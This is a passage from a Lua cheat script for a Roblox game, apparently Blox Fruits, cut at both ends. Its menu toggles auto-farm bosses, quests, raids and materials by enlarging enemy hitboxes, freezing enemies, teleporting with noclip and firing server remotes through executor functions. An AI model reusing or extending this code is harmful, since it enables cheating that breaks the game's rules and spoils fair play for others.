                                        toPoint(PlatesPosition)
                                    until getDistance(PlatesPosition) < 20
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate1
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate2
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate3
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate4
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate5
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate6
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate7
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                                plate = workspace.Map.Dressrosa.BartiloPlates.Plate8
                                if plate.BrickColor ~= BrickColor.new("Olivine") then
                                    repeat wait()
                                        toPoint(plate.CFrame)
                                    until plate.BrickColor == BrickColor.new("Olivine") or not AutoBartilo or ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates
                                end
                            end
                        end 
                    end)
                end
            end)

            AutoSea3Toggle = Sea2ItemsSection:NewToggle("Auto Open Sea 3", function(state)
                getgenv().EuphoriaSettings["Auto Open Sea 3"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Open Sea 3"] then AutoSea3Toggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Auto Open Sea 3"] then AutoSea3 = true else AutoSea3 = false end
                    end)
                end
            end)

            spawn(function()
                while wait() do
                    pcall(function()
                        if AutoSea3 and LP.Data.Level.Value >= 1500 and second_sea then
                            if game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ZQuestProgress", "Zou") ~= 0 then
                                if not ReplicatedStorage.Remotes.CommF_:InvokeServer("BartiloQuestProgress").DidPlates then
                                    AutoSea3Bartilo = true
                                else
                                    AutoSea3Bartilo = false 
                                    Unlockables = game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("GetUnlockables")
                                    if not Unlockables.FlamingoAccess then
                                        fruitUnused = getUnusable1MFruit()
                                        if fruitUnused then
                                            storeAllFruits()
                                            wait(.2)
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("LoadFruit", fruitUnused)
                                            wait(.1)
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor","1")
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor","2")
                                            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TalkTrevor","3")
                                        else
                                            notis.new("<Color=Red>Need to get 1M Unusable fruit!<Color=/>"):Display()
                                        end
                                    elseif not Unlockables.SwanShip then
                                        AutoSea3DonSwan = true
                                        AutoSea3DonSwanHop = true
                                    else
                                        AutoSea3DonSwan = true
                                        AutoSea3DonSwanHop = true
                                        if not game:GetService("Workspace").Enemies:FindFirstChild("rip_indra") then
                                            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("ZQuestProgress", "Begin")
                                        else
                                            v = game:GetService("Workspace").Enemies:FindFirstChild("rip_indra")
                                            if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                                repeat wait()
                                                    ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                                    v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                                    v.HumanoidRootPart.CanCollide = false
                                                    v.Humanoid.WalkSpeed = 0
                                                    v.Head.CanCollide = false
                                                    BringMobFarm = false
                                                    EquipWeapon(_G.SelectWeapon)
                                                    v.HumanoidRootPart.Transparency = 1
                                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                                until not AutoSea3 or v.Humanoid.Health <= 0 or not v.Parent
                                                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                            end
                                        end
                                        game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                                    end
                                end
                            else
                                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TravelZou")
                            end
                        else
                            AutoSea3Bartilo = false
                            AutoSea3DonSwan = false
                            AutoSea3DonSwanHop = false 
                        end
                    end)
                end
            end)



            AutoFactory = Sea2ItemsSection:NewToggle("Auto Factory", function(state)
                getgenv().EuphoriaSettings["Auto Factory"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Factory"] then AutoFactory:UpdateToggle(nil, true) end
            AutoFactoryHop = Sea2ItemsSection:NewToggle("Auto Factory Hop [Farm only boss then]", function(state)
                getgenv().EuphoriaSettings["Auto Factory Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Factory Hop"] then AutoFactoryHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")
            -- =====
            -- Darkbeard
            AutoKillDarkbeard = Sea2ItemsSection:NewToggle("Auto Kill Darkbeard", function(state)
                getgenv().EuphoriaSettings["Auto Kill Darkbeard"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Kill Darkbeard"] then AutoKillDarkbeard:UpdateToggle(nil, true) end
            AutoKillDarkbeard = Sea2ItemsSection:NewButton("Spawn Darkbeard", function()
                if isItemInEquip("Fist of Darkness") then
                    firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.DarkbeardArena.Summoner.Detection, 0)
                    wait()
                    firetouchinterest(LP.Character.HumanoidRootPart, workspace.Map.DarkbeardArena.Summoner.Detection, 1)
                end
            end)
            
            Sea2ItemsSection:NewLabel(" ")
            -- =====
            -- Cursed Captain
            AutoGhoulRace = Sea2ItemsSection:NewToggle("Auto Ghoul Race", function(state)
                getgenv().EuphoriaSettings["Auto Ghoul Race"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Ghoul Race"] then AutoGhoulRace:UpdateToggle(nil, true) end
            AutoGhoulRaceHop = Sea2ItemsSection:NewToggle("Auto Ghoul Race Hop", function(state)
                getgenv().EuphoriaSettings["Auto Ghoul Race Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Ghoul Race Hop"] then AutoGhoulRaceHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")
            -- =====

            AutoRengoku = Sea2ItemsSection:NewToggle("Auto Rengoku", function(state)
                getgenv().EuphoriaSettings["Auto Rengoku"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Rengoku"] then AutoRengoku:UpdateToggle(nil, true) end
            AutoRengokuHop = Sea2ItemsSection:NewToggle("Auto Rengoku Hop [Farm only boss then]", function(state)
                getgenv().EuphoriaSettings["Auto Rengoku Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Auto Rengoku Hop"] then AutoRengokuHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")

            AutoKillTideKeeper = Sea2ItemsSection:NewToggle("Farm Water Key", function(state)
                getgenv().EuphoriaSettings["Farm Water Key"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Water Key"] then AutoKillTideKeeper:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Water Key"] then FarmWaterKey = true else FarmWaterKey = false end
                    end)
                end
            end)
            AutoKillTideKeeperHop = Sea2ItemsSection:NewToggle("Farm Water Key Hop", function(state)
                getgenv().EuphoriaSettings["Farm Water Key Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Water Key Hop"] then AutoKillTideKeeperHop:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Water Key Hop"] then FarmWaterKeyHop = true else FarmWaterKeyHop = false end
                    end)
                end
            end)

            FarmLibraryKeyToggle = Sea2ItemsSection:NewToggle("Farm Library Key", function(state)
                getgenv().EuphoriaSettings["Farm Library Key"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Library Key"] then FarmLibraryKeyToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Library Key"] then FarmLibraryKey = true else FarmLibraryKey = false end
                    end)
                end
            end)
            FarmLibraryKeyHopToggle = Sea2ItemsSection:NewToggle("Farm Library Key Hop", function(state)
                getgenv().EuphoriaSettings["Farm Library Key Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Library Key Hop"] then FarmLibraryKeyHopToggle:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Library Key Hop"] then FarmLibraryKeyHop = true else FarmLibraryKeyHop = false end
                    end)
                end
            end)

            Sea2ItemsSection:NewLabel(" ")

            AutoSwanGlasses = Sea2ItemsSection:NewToggle("Swan Glasses [Must Be Swan Room Opened]", function(state)
                getgenv().EuphoriaSettings["Swan Glasses"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Swan Glasses"] then AutoSwanGlasses:UpdateToggle(nil, true) end
            AutoSwanGlassesHop = Sea2ItemsSection:NewToggle("Swan Glasses Hop", function(state)
                getgenv().EuphoriaSettings["Swan Glasses Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Swan Glasses Hop"] then AutoSwanGlassesHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")

            AutoGravityCane = Sea2ItemsSection:NewToggle("Auto Gravity Cane", function(state)
                getgenv().EuphoriaSettings["Gravity Cane"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Gravity Cane"] then AutoGravityCane:UpdateToggle(nil, true) end
            AutoGravityCaneHop = Sea2ItemsSection:NewToggle("Auto Gravity Cane Hop", function(state)
                getgenv().EuphoriaSettings["Gravity Cane Hop"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Gravity Cane Hop"] then AutoGravityCaneHop:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewLabel(" ")

            Sea2ItemsSection:NewLabel("Farm Koko / Cyborg")
            Sea2ItemsSection:NewToggle("Auto Kill Order", function(state)
                _G.AutoKillOrder = state
            end)
            Sea2ItemsSection:NewToggle("Auto Buy Order chip", function(state)
                _G.AutoBuyOrderChip = state
            end)
            autostartorder1 = Sea2ItemsSection:NewToggle("Auto Start Order", function(state)
                if autostartorder2 and state then autostartorder2:UpdateToggle(nil, false) end
                getgenv().EuphoriaSettings['AutoStartOrder'] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings['AutoStartOrder'] then autostartorder1:UpdateToggle(nil, true) end
            _G.TeammatesForStart = 1
            autostartorder2 = Sea2ItemsSection:NewToggle("Auto Start Order With Teammates", function(state)
                if autostartorder1 and state then autostartorder1:UpdateToggle(nil, false) end
                getgenv().EuphoriaSettings['AutoStartOrderWithTeammates'] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings['AutoStartOrderWithTeammates'] then autostartorder2:UpdateToggle(nil, true) end
            Sea2ItemsSection:NewSlider("Min. Teammates", 1, 4, function(count)
                _G.TeammatesForStart = count
            end)
            AutoCyborgTeammate = Sea2ItemsSection:NewToggle("Auto Cyborg Race [ Self Mode ]", function(state)
                getgenv().EuphoriaSettings['Auto Cyborg Race Self'] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings['Auto Cyborg Race Self'] then AutoCyborgTeammate:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings['Auto Cyborg Race Self'] then
                            _G.AutoCyborgRaceSelf = true
                        else
                            _G.AutoCyborgRaceSelf = false
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    local s, e = pcall(function()
                        if _G.AutoCyborgRaceSelf and LP.Data.Race.Value ~= "Cyborg" then
                            if workspace.Map.CircleIsland:FindFirstChild("BlockPart") and workspace.Map.CircleIsland:FindFirstChild("BlockPart").CanCollide then
                                if isItemInEquip("Core Brain") then
                                    fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector) 
                                else
                                    if not isItemInEquip("Microchip") and not game:GetService("Workspace").Enemies:FindFirstChild("Order") then 
                                        if not game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "Microchip", "2")
                                        end
                                    else
                                        fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector) 
                                    end
                                    v = game:GetService("Workspace").Enemies:FindFirstChild("Order")
                                    if v and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = falsew
                                            BringMobFarm = false
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            if getDistance(v.HumanoidRootPart.CFrame) > 1000 then
                                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            end
                                            toTarget(CFrame.new(v.HumanoidRootPart.Position) * OffsetCFrame())
                                        until not _G.AutoCyborgRaceSelf or v.Humanoid.Health <= 0 or not v.Parent
                                    end
                                end
                            else                  
                                if LP.Data.Fragments.Value < 2500 then
                                    notis.new("<Color=Yellow>Not enough fragments!<Color=/>"):Display()
                                end              
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CyborgTrainer", "Check")
                                wait()
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CyborgTrainer", "Buy")
                                wait()
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CyborgTrainer", "Change")
                            end
                        end
                    end)
                    if e then print(e) end
                end
            end)
            AutoCyborgTeammate = Sea2ItemsSection:NewToggle("Auto Cyborg Race [ Teammate Mode ]", function(state)
                getgenv().EuphoriaSettings['Auto Cyborg Race Teammate'] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings['Auto Cyborg Race Teammate'] then AutoCyborgTeammate:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings['Auto Cyborg Race Teammate'] then
                            _G.AutoCyborgRaceTeammate = true
                        else
                            _G.AutoCyborgRaceTeammate = false
                        end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    local s, e = pcall(function()
                        if _G.AutoCyborgRaceTeammate and LP.Data.Race.Value ~= "Cyborg" then
                            if workspace.Map.CircleIsland:FindFirstChild("BlockPart") and workspace.Map.CircleIsland:FindFirstChild("BlockPart").CanCollide then
                                if isItemInEquip("Core Brain") then
                                    fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector) 
                                else
                                    v = game:GetService("Workspace").Enemies:FindFirstChild("Order")
                                    if v and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = falsew
                                            BringMobFarm = false
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            if getDistance(v.HumanoidRootPart.CFrame) > 1000 then
                                                useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                            end
                                            toTarget(CFrame.new(v.HumanoidRootPart.Position) * OffsetCFrame())
                                        until not _G.AutoCyborgRaceTeammate or v.Humanoid.Health <= 0 or not v.Parent
                                    else
                                        cf = _G.CellCFrame
                                        if useNearestEntrance(cf) then
                                            StopTween()
                                        end
                                        toPoint(cf)  
                                    end
                                end
                            else                  
                                if LP.Data.Fragments.Value < 2500 then
                                    notis.new("<Color=Yellow>Not enough fragments!<Color=/>"):Display()
                                end              
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CyborgTrainer", "Check")
                                wait()
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CyborgTrainer", "Buy")
                                wait()
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("CyborgTrainer", "Change")
                            end
                        end
                    end)
                    if e then print(e) end
                end
            end)

            Sea2ItemsSection:NewButton("Tween to teammate cell", function()
                if second_sea then
                    cf = _G.CellCFrame
                    StoppedTween = false
                    repeat wait()
                        NoClip = true
                        useNearestEntrance(cf)
                        toPoint(cf)
                    until (LP.Character.HumanoidRootPart.CFrame.Position - cf.Position).Magnitude < 20 or StoppedTween
                    NoClip = false
                end
            end)
            TeammateCellDropdown = Sea2ItemsSection:NewDropdown("Teammate Cell", {"1", "2", "3", "4"}, function(selected)
                cframes = {
                    ["1"] = CFrame.new(-5577.11084, 337.279449, -5879.2207, -0.852391958, 0, 0.522903383, 0, 1, 0, -0.522903383, 0, -0.852391958),
                    ["2"] = CFrame.new(-5582.35498, 337.279358, -5893.75098, 0.930309832, 0, 0.366774619, 0, 1, 0, -0.366774619, 0, 0.930309832),
                    ["3"] = CFrame.new(-5586.23096, 337.279358, -5906.05566, 0.955127656, 0, 0.296194464, 0, 1, 0, -0.296194464, 0, 0.955127656),
                    ["4"] = CFrame.new(-5590.30762, 337.279358, -5920.48975, 0.965189993, 0, 0.26154986, 0, 1, 0, -0.26154986, 0, 0.965189993),
                }
                _G.CellCFrame = cframes[selected]
                getgenv().EuphoriaSettings["Teammate Cell"] = selected
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Teammate Cell"] then
                TeammateCellDropdown:UpdateSelect(getgenv().EuphoriaSettings["Teammate Cell"])
            else
                TeammateCellDropdown:UpdateSelect("1")
            end
        end

        spawn(function()
            while task.wait() do
                pcall(function()
                    if _G.AutoKillOrder and second_sea and game:GetService("Workspace").Enemies:FindFirstChild("Order") and game:GetService("Workspace").Enemies:FindFirstChild("Order"):FindFirstChild('Humanoid') and game:GetService("Workspace").Enemies:FindFirstChild("Order").Humanoid.Health > 0 then
                        _G.KillingOrder = true
                    else
                        _G.KillingOrder = false
                    end
                end)
            end
        end)

        spawn(function()
            while task.wait() do
                pcall(function()
                    if _G.KillingOrder then
                        _G.MarkedAsKillingOrder = true
                        v = game:GetService("Workspace").Enemies:FindFirstChild("Order")
                        if v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                            repeat task.wait()
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                v.HumanoidRootPart.CanCollide = false
                                v.Humanoid.WalkSpeed = 0
                                v.Head.CanCollide = false
                                BringMobFarm = false
                                EquipWeapon(_G.SelectWeapon)
                                v.HumanoidRootPart.Transparency = 1
                                if getDistance(v.HumanoidRootPart.CFrame) > 1000 then
                                    useNearestEntrance(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                end
                                toTarget(CFrame.new(v.HumanoidRootPart.Position) * OffsetCFrame())
                            until not _G.AutoKillOrder or not _G.KillingOrder or v.Humanoid.Health <= 0 or not v.Parent
                        end
                    else
                        if _G.MarkedAsKillingOrder then
                            toPoint(CFrame.new(game.Players.LocalPlayer.HumanoidRootPart.Position) * CFrame.new(0,60,0))
                            _G.MarkedAsKillingOrder = false
                        end
                    end
                end)
            end
        end)

        spawn(function()
            while wait() do
                wait(2)
                s1, e1 = pcall(function()
                    if _G.AutoBuyOrderChip then
                        if not isItemInEquip("Microchip") then 
                            if not game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                                ReplicatedStorage.Remotes.CommF_:InvokeServer("BlackbeardReward", "Microchip", "2")
                            end
                        end
                    end
                end)
                if e1 then print(e1) end
            end
        end)

        spawn(function()
            while wait() do
                pcall(function()
                    if getgenv().EuphoriaSettings['AutoStartOrder'] then
                        if isItemInEquip("Microchip") or isItemInEquip("Fist of Darkness") or isItemInEquip("Core Brain") then
                            if not game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                                print("Trying to start raid")
                                fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector) 
                            end
                        end
                    elseif getgenv().EuphoriaSettings['AutoStartOrderWithTeammates'] then
                        if isItemInEquip("Microchip") and not game:GetService("Workspace").Enemies:FindFirstChild("Order") then
                            count = 0
                            if game:GetService("Workspace").Map.CircleIsland.RaidSummon.Raid1.Color.BrickColor == BrickColor.new("Lime green") then
                                count = count + 1
                            end
                            if game:GetService("Workspace").Map.CircleIsland.RaidSummon.Raid2.Color.BrickColor == BrickColor.new("Lime green") then
                                count = count + 1
                            end
                            if game:GetService("Workspace").Map.CircleIsland.RaidSummon.Raid3.Color.BrickColor == BrickColor.new("Lime green") then
                                count = count + 1
                            end
                            if game:GetService("Workspace").Map.CircleIsland.RaidSummon.Raid4.Color.BrickColor == BrickColor.new("Lime green") then
                                count = count + 1
                            end
                            if count >= _G.TeammatesForStart then 
                                print("Trying to start raid")
                                fireclickdetector(game:GetService("Workspace").Map.CircleIsland.RaidSummon.Button.Main.ClickDetector) 
                            end
                        end
                    end
                end)
            end
        end)


        if third_sea then
            local Sea3ItemsSection = FarmTab:NewSection("Sea 3 Items")
            local Sea3MaterialsSection = FarmTab:NewSection("Sea 3 Materials")
            FarmCocoa = Sea3MaterialsSection:NewToggle("Farm Conjured Cocoa", function(state)
                getgenv().EuphoriaSettings["Farm Conjured Cocoa"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Conjured Cocoa"] then FarmCocoa:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Conjured Cocoa"] then _G.FarmCocoa = true else _G.FarmCocoa = false end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    if _G.FarmCocoa and third_sea then
                        pcall(function()
                            if game:GetService("Workspace").Enemies:FindFirstChild("Chocolate Bar Battler") or game:GetService("Workspace").Enemies:FindFirstChild("Candy Rebel") or game:GetService("Workspace").Enemies:FindFirstChild("Cocoa Warrior") or game:GetService("Workspace").Enemies:FindFirstChild("Sweet Thief") then
                                target = getClosest({"Chocolate Bar Battler", "Candy Rebel", "Cocoa Warrior", "Sweet Thief"})
                                if target then
                                    v = target
                                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.FarmCocoa or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            elseif ReplicatedStorage:FindFirstChild("Chocolate Bar Battler") or ReplicatedStorage:FindFirstChild("Candy Rebel") or ReplicatedStorage:FindFirstChild("Cocoa Warrior") or ReplicatedStorage:FindFirstChild("Sweet Thief") then
                                target = getClosest({"Chocolate Bar Battler", "Candy Rebel", "Cocoa Warrior", "Sweet Thief"})
                                if target then
                                    v = target
                                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.FarmCocoa or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            else
                                pos = CFrame.new(264.833435, 43.5868988, -12724.9033, -0.524356186, 8.38680876e-08, 0.851499021, 1.12196048e-07, 1, -2.94039033e-08, -0.851499021, 8.01167062e-08, -0.524356186)
                                useNearestEntrance(pos)
                                toPoint(pos)
                            end
                        end)
                    end
                end
            end) 
            FarmDragonScale = Sea3MaterialsSection:NewToggle("Farm Dragon Scale", function(state)
                getgenv().EuphoriaSettings["Farm Dragon Scale"] = state
                WriteSettings()
            end)
            if getgenv().EuphoriaSettings["Farm Dragon Scale"] then FarmDragonScale:UpdateToggle(nil, true) end
            spawn(function()
                while wait() do
                    pcall(function()
                        if getgenv().EuphoriaSettings["Farm Dragon Scale"] then _G.FarmDragonScale = true else _G.FarmDragonScale = false end
                    end)
                end
            end)
            spawn(function()
                while wait() do
                    if _G.FarmDragonScale and third_sea then
                        pcall(function()
                            if game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Archer") or game:GetService("Workspace").Enemies:FindFirstChild("Dragon Crew Warrior") then
                                target = getClosest({"Dragon Crew Warrior", "Dragon Crew Archer"})
                                if target then
                                    v = target
                                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.FarmDragonScale or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            elseif ReplicatedStorage:FindFirstChild("Dragon Crew Archer") or ReplicatedStorage:FindFirstChild("Dragon Crew Warrior") then
                                target = getClosest({"Dragon Crew Warrior", "Dragon Crew Archer"})
                                if target then
                                    v = target
                                    if v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 then
                                        repeat task.wait()
                                            ReplicatedStorage.Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                            v.HumanoidRootPart.Size = Vector3.new(90,90,90)
                                            v.HumanoidRootPart.CanCollide = false
                                            v.Humanoid.WalkSpeed = 0
                                            v.Head.CanCollide = false
                                            BringMobFarm = true
                                            PosMon = v.HumanoidRootPart.CFrame
                                            EquipWeapon(_G.SelectWeapon)
                                            v.HumanoidRootPart.Transparency = 1
                                            toTarget(v.HumanoidRootPart.CFrame * OffsetCFrame())
                                        until not _G.FarmDragonScale or not v.Parent or v.Humanoid.Health <= 0
                                    end
                                end
                            else
                                for i,v in pairs(workspace._WorldOrigin.EnemySpawns:GetChildren()) do
                                    if string.find(v.Name, "Dragon Crew Warrior") or string.find(v.Name, "Dragon Crew Archer") then
                                        if getDistance(v.CFrame) > 500 then
                                            repeat wait()
                                                useNearestEntrance(v.CFrame * CFrame.new(0,50,0))
                                                toPoint(v.CFrame * CFrame.new(0,50,0))
